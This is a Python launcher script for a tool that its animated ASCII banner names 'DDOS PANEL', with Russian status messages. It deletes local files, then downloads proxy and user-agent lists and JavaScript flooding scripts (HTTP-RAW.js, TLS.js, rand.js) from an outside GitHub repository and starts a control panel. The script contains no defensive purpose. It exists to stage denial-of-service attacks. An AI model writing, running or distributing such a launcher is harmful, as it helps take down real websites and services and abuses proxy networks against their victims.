import os
os.system("pip3 install requests")
import requests
import random
import time

mss = random.randint(3,9)
ua = random.randint(3,9)
mth = random.randint(3,9)
os.system("clear")
l1 = ('''



██████╗░
██╔══██╗
██║░░██║
██║░░██║
██████╔╝
╚═════╝░
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░
██╔══██╗██╔══██╗
██║░░██║██║░░██║
██║░░██║██║░░██║
██████╔╝██████╔╝
╚═════╝░╚═════╝░
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░
██╔══██╗██╔══██╗██╔══██╗
██║░░██║██║░░██║██║░░██║
██║░░██║██║░░██║██║░░██║
██████╔╝██████╔╝╚█████╔╝
╚═════╝░╚═════╝░░╚════╝░
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██████╗░
██╔══██╗
██████╔╝
██╔═══╝░
██║░░░░░
╚═╝░░░░░
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██████╗░░█████╗░
██╔══██╗██╔══██╗
██████╔╝███████║
██╔═══╝░██╔══██║
██║░░░░░██║░░██║
╚═╝░░░░░╚═╝░░╚═╝
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██████╗░░█████╗░███╗░░██╗
██╔══██╗██╔══██╗████╗░██║
██████╔╝███████║██╔██╗██║
██╔═══╝░██╔══██║██║╚████║
██║░░░░░██║░░██║██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██████╗░░█████╗░███╗░░██╗███████╗
██╔══██╗██╔══██╗████╗░██║██╔════╝
██████╔╝███████║██╔██╗██║█████╗░░
██╔═══╝░██╔══██║██║╚████║██╔══╝░░
██║░░░░░██║░░██║██║░╚███║███████╗
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝
''')
print(l1)
time.sleep(1)
os.system("clear")
l1 = ('''



██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░

██████╗░░█████╗░███╗░░██╗███████╗██╗░░░░░
██╔══██╗██╔══██╗████╗░██║██╔════╝██║░░░░░
██████╔╝███████║██╔██╗██║█████╗░░██║░░░░░
██╔═══╝░██╔══██║██║╚████║██╔══╝░░██║░░░░░
██║░░░░░██║░░██║██║░╚███║███████╗███████╗
╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚══════╝
''')
print(l1)
time.sleep(1)
os.system("clear")

print("Загрузка прокси...")
os.system("rm proxy.txt")
time.sleep(mss)
pr = open('proxy.txt', 'a+', encoding='utf-8')
px = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/proxy.txt").text
pr.write(px)
os.system("clear")
print("Загрузка UA...")
os.system("rm ua.txt")
time.sleep(ua)
ua = open('ua.txt', 'a+', encoding='utf-8')
uas = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/ua.txt").text
ua.write(uas)
os.system("clear")
print("Загрузка методов...")
time.sleep(mth)
#Загрузка rand.js
os.system("rm rand.js")
rand = open('rand.js', 'a+', encoding='utf-8')
ran = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/rand.js").text
rand.write(ran)
os.system("clear")
#Загрузка http-raw
os.system("rm HTTP-RAW.js")
htt = open('HTTP-RAW.js', 'a+', encoding='utf-8')
htr = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/HTTP-RAW.js").text
htt.write(htr)
os.system("clear")
#Загрузка tcp-kill
os.system("rm TLS.js")
tck = open('TLS.js', 'a+', encoding='utf-8')
tcg = requests.get("https://raw.githubusercontent.com/Bwz72829191/fx/main/TLS.js").text
tck.write(tcg)
os.system("clear")
os.system("python panel.py")